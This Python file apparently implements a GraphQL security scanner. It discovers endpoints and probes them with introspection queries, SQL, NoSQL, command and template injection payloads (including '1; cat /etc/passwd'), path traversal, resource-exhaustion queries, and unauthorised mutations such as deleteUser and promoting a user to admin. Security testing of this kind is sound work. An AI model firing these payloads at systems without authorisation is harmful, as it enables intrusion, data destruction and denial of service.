import requests
import json
import time
from typing import Dict, List, Any

class GraphQLSecurityTester:
    """Advanced GraphQL security testing with introspection and injection"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.graphql_endpoints = [
            '/graphql',
            '/api/graphql', 
            '/v1/graphql',
            '/query',
            '/api/query'
        ]
        self.vulnerabilities = []
        
    def find_graphql_endpoint(self) -> str:
        """Discover GraphQL endpoint"""
        print("🔍 Discovering GraphQL endpoints...")
        
        for endpoint in self.graphql_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                
                # Test with introspection query
                query = {"query": "{ __schema { types { name } } }"}
                response = requests.post(url, json=query, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'data' in data and '__schema' in data['data']:
                            print(f"✅ Found GraphQL at: {endpoint}")
                            return endpoint
                    except:
                        pass
                        
                # Test with simple query
                query = {"query": "{ __typename }"}
                response = requests.post(url, json=query, timeout=5)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'data' in data:
                            print(f"✅ Found GraphQL at: {endpoint}")
                            return endpoint
                    except:
                        pass
                        
            except Exception as e:
                continue
                
        print("❌ No GraphQL endpoint found")
        return None
    
    def test_introspection(self, endpoint: str) -> Dict[str, Any]:
        """Test GraphQL introspection queries"""
        print("\n🔍 Testing GraphQL Introspection...")
        
        introspection_queries = [
            # Full schema introspection
            {
                "name": "Full Schema",
                "query": """
                query IntrospectionQuery {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        subscriptionType { name }
                        types {
                            ...FullType
                        }
                    }
                }
                
                fragment FullType on __Type {
                    kind
                    name
                    description
                    fields(includeDeprecated: true) {
                        name
                        description
                        args {
                            ...InputValue
                        }
                        type {
                            ...TypeRef
                        }
                    }
                }
                
                fragment InputValue on __InputValue {
                    name
                    description
                    type { ...TypeRef }
                    defaultValue
                }
                
                fragment TypeRef on __Type {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                        }
                    }
                }
                """
            },
            
            # Simple introspection
            {
                "name": "Simple Schema",
                "query": "{ __schema { types { name kind } } }"
            },
            
            # Query type introspection
            {
                "name": "Query Type",
                "query": "{ __schema { queryType { fields { name type { name } } } } }"
            },
            
            # Mutation type introspection  
            {
                "name": "Mutation Type",
                "query": "{ __schema { mutationType { fields { name args { name type { name } } } } } }"
            }
        ]
        
        schema_info = {}
        
        for query_info in introspection_queries:
            try:
                url = f"{self.base_url}{endpoint}"
                response = requests.post(url, json={"query": query_info["query"]}, timeout=10)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'data' in data and data['data']:
                            print(f"✅ {query_info['name']} introspection successful")
                            schema_info[query_info['name']] = data['data']
                            
                            # Check for sensitive fields
                            schema_str = json.dumps(data['data']).lower()
                            sensitive_keywords = ['password', 'secret', 'token', 'key', 'admin', 'internal']
                            found_sensitive = [kw for kw in sensitive_keywords if kw in schema_str]
                            
                            if found_sensitive:
                                self.vulnerabilities.append({
                                    "type": "Sensitive Schema Fields",
                                    "severity": "HIGH",
                                    "details": f"Found sensitive fields: {found_sensitive}"
                                })
                                print(f"⚠️  Sensitive fields exposed: {found_sensitive}")
                        else:
                            print(f"❌ {query_info['name']} introspection blocked")
                    except json.JSONDecodeError:
                        print(f"❌ {query_info['name']} invalid JSON response")
                else:
                    print(f"❌ {query_info['name']} failed with status {response.status_code}")
                    
            except Exception as e:
                print(f"❌ {query_info['name']} error: {str(e)}")
                
        return schema_info
    
    def test_injection_attacks(self, endpoint: str) -> None:
        """Test GraphQL injection vulnerabilities"""
        print("\n💉 Testing GraphQL Injection Attacks...")
        
        injection_payloads = [
            # SQL injection in GraphQL
            {
                "name": "SQL Injection",
                "query": """{ user(id: "1' OR '1'='1") { id name email } }"""
            },
            
            # NoSQL injection
            {
                "name": "NoSQL Injection", 
                "query": """{ user(id: {"$ne": null}) { id name email } }"""
            },
            
            # Command injection
            {
                "name": "Command Injection",
                "query": """{ user(id: "1; cat /etc/passwd") { id name } }"""
            },
            
            # Template injection
            {
                "name": "Template Injection",
                "query": """{ user(name: "{{7*7}}") { id name } }"""
            },
            
            # Path traversal
            {
                "name": "Path Traversal",
                "query": """{ file(path: "../../../etc/passwd") { content } }"""
            }
        ]
        
        for payload in injection_payloads:
            try:
                url = f"{self.base_url}{endpoint}"
                response = requests.post(url, json={"query": payload["query"]}, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        response_text = json.dumps(data).lower()
                        
                        # Check for injection indicators
                        sql_indicators = ['syntax error', 'mysql', 'postgres', 'oracle', 'sqlite']
                        nosql_indicators = ['mongodb', 'bson', 'objectid']
                        file_indicators = ['root:', '/bin/', 'etc/passwd']
                        template_indicators = ['49', '7*7', 'templateerror']
                        
                        all_indicators = sql_indicators + nosql_indicators + file_indicators + template_indicators
                        found_indicators = [ind for ind in all_indicators if ind in response_text]
                        
                        if found_indicators:
                            self.vulnerabilities.append({
                                "type": f"{payload['name']} Vulnerability",
                                "severity": "CRITICAL",
                                "details": f"Injection successful. Indicators: {found_indicators}",
                                "payload": payload["query"]
                            })
                            print(f"🚨 {payload['name']} VULNERABLE! Indicators: {found_indicators}")
                        else:
                            print(f"✅ {payload['name']} protected")
                            
                    except json.JSONDecodeError:
                        print(f"❌ {payload['name']} invalid response")
                else:
                    print(f"❌ {payload['name']} failed with status {response.status_code}")
                    
            except Exception as e:
                print(f"❌ {payload['name']} error: {str(e)}")
    
    def test_dos_attacks(self, endpoint: str) -> None:
        """Test GraphQL DoS vulnerabilities"""
        print("\n💥 Testing GraphQL DoS Attacks...")
        
        dos_queries = [
            # Deeply nested query
            {
                "name": "Deep Nesting Attack",
                "query": """
                {
                    user {
                        posts {
                            comments {
                                replies {
                                    user {
                                        posts {
                                            comments {
                                                replies {
                                                    user { id }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                """
            },
            
            # Query with aliases (resource exhaustion)
            {
                "name": "Alias Attack",
                "query": """
                {
                    """ + "\n".join([f"user{i}: user(id: 1) {{ id name email }}" for i in range(100)]) + """
                }
                """
            },
            
            # Circular query fragments
            {
                "name": "Circular Fragment",
                "query": """
                query {
                    ...UserFragment
                }
                
                fragment UserFragment on User {
                    id
                    posts {
                        ...PostFragment
                    }
                }
                
                fragment PostFragment on Post {
                    id
                    author {
                        ...UserFragment
                    }
                }
                """
            }
        ]
        
        for dos_query in dos_queries:
            try:
                url = f"{self.base_url}{endpoint}"
                start_time = time.time()
                
                response = requests.post(url, json={"query": dos_query["query"]}, timeout=30)
                elapsed_time = time.time() - start_time
                
                if elapsed_time > 10:  # Query took longer than 10 seconds
                    self.vulnerabilities.append({
                        "type": f"GraphQL DoS - {dos_query['name']}",
                        "severity": "HIGH", 
                        "details": f"Query execution time: {elapsed_time:.2f}s",
                        "payload": dos_query["query"][:200] + "..."
                    })
                    print(f"⚠️  {dos_query['name']} - Slow response: {elapsed_time:.2f}s")
                else:
                    print(f"✅ {dos_query['name']} - Normal response time: {elapsed_time:.2f}s")
                    
            except requests.exceptions.Timeout:
                self.vulnerabilities.append({
                    "type": f"GraphQL DoS - {dos_query['name']}",
                    "severity": "CRITICAL",
                    "details": "Query caused timeout (>30s)",
                    "payload": dos_query["query"][:200] + "..."
                })
                print(f"🚨 {dos_query['name']} - TIMEOUT! Potential DoS vulnerability")
            except Exception as e:
                print(f"❌ {dos_query['name']} error: {str(e)}")
    
    def test_authorization_bypass(self, endpoint: str) -> None:
        """Test GraphQL authorization bypass"""
        print("\n🔓 Testing GraphQL Authorization Bypass...")
        
        # Test different queries that might bypass authorization
        bypass_queries = [
            # Direct field access
            {"query": "{ users { id email password admin } }"},
            {"query": "{ adminUsers { id email permissions } }"},
            {"query": "{ internalData { secrets apiKeys } }"},
            
            # Batch queries
            {
                "query": """
                query {
                    a: user(id: 1) { id email }
                    b: user(id: 2) { id email }
                    c: user(id: 3) { id email }
                }
                """
            },
            
            # Mutation without proper auth
            {"query": "mutation { deleteUser(id: 1) { success } }"},
            {"query": "mutation { updateUser(id: 1, role: \"admin\") { id role } }"}
        ]
        
        for query_data in bypass_queries:
            try:
                url = f"{self.base_url}{endpoint}"
                response = requests.post(url, json=query_data, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'data' in data and data['data']:
                            # Check if we got actual data (not just errors)
                            if not data.get('errors'):
                                self.vulnerabilities.append({
                                    "type": "GraphQL Authorization Bypass",
                                    "severity": "CRITICAL",
                                    "details": "Query succeeded without proper authorization",
                                    "payload": query_data["query"]
                                })
                                print(f"🚨 Authorization bypass detected!")
                                print(f"   Query: {query_data['query'][:100]}...")
                            else:
                                print(f"✅ Query properly rejected: {data['errors'][0]['message'][:50]}...")
                        else:
                            print("✅ Query rejected - no data returned")
                    except json.JSONDecodeError:
                        print("❌ Invalid JSON response")
                else:
                    print(f"✅ Query rejected with status {response.status_code}")
                    
            except Exception as e:
                print(f"❌ Error testing query: {str(e)}")
    
    def run_full_test(self) -> Dict[str, Any]:
        """Run complete GraphQL security test suite"""
        print("="*60)
        print("🔍 GRAPHQL SECURITY TESTING SUITE")
        print("="*60)
        
        # Find GraphQL endpoint
        endpoint = self.find_graphql_endpoint()
        if not endpoint:
            return {"status": "No GraphQL endpoint found"}
        
        # Run all tests
        schema_info = self.test_introspection(endpoint)
        self.test_injection_attacks(endpoint)
        self.test_dos_attacks(endpoint)
        self.test_authorization_bypass(endpoint)
        
        # Generate report
        report = {
            "endpoint": endpoint,
            "schema_exposed": bool(schema_info),
            "vulnerabilities": self.vulnerabilities,
            "total_vulnerabilities": len(self.vulnerabilities),
            "critical_count": len([v for v in self.vulnerabilities if v["severity"] == "CRITICAL"]),
            "high_count": len([v for v in self.vulnerabilities if v["severity"] == "HIGH"])
        }
        
        # Print summary
        print("\n" + "="*60)
        print("📊 GRAPHQL SECURITY REPORT")
        print("="*60)
        print(f"Endpoint: {endpoint}")
        print(f"Schema Introspection: {'EXPOSED' if schema_info else 'PROTECTED'}")
        print(f"Total Vulnerabilities: {report['total_vulnerabilities']}")
        print(f"Critical: {report['critical_count']}")
        print(f"High: {report['high_count']}")
        
        if self.vulnerabilities:
            print("\n🚨 VULNERABILITIES FOUND:")
            for vuln in self.vulnerabilities:
                print(f"  {vuln['severity']}: {vuln['type']}")
                print(f"    → {vuln['details']}")
        
        return report

# Usage example
if __name__ == "__main__":
    # Test your application
    tester = GraphQLSecurityTester("https://your-app-url.com")
    results = tester.run_full_test()
    
    # Save results
    with open("graphql_security_report.json", "w") as f:
        json.dump(results, f, indent=2)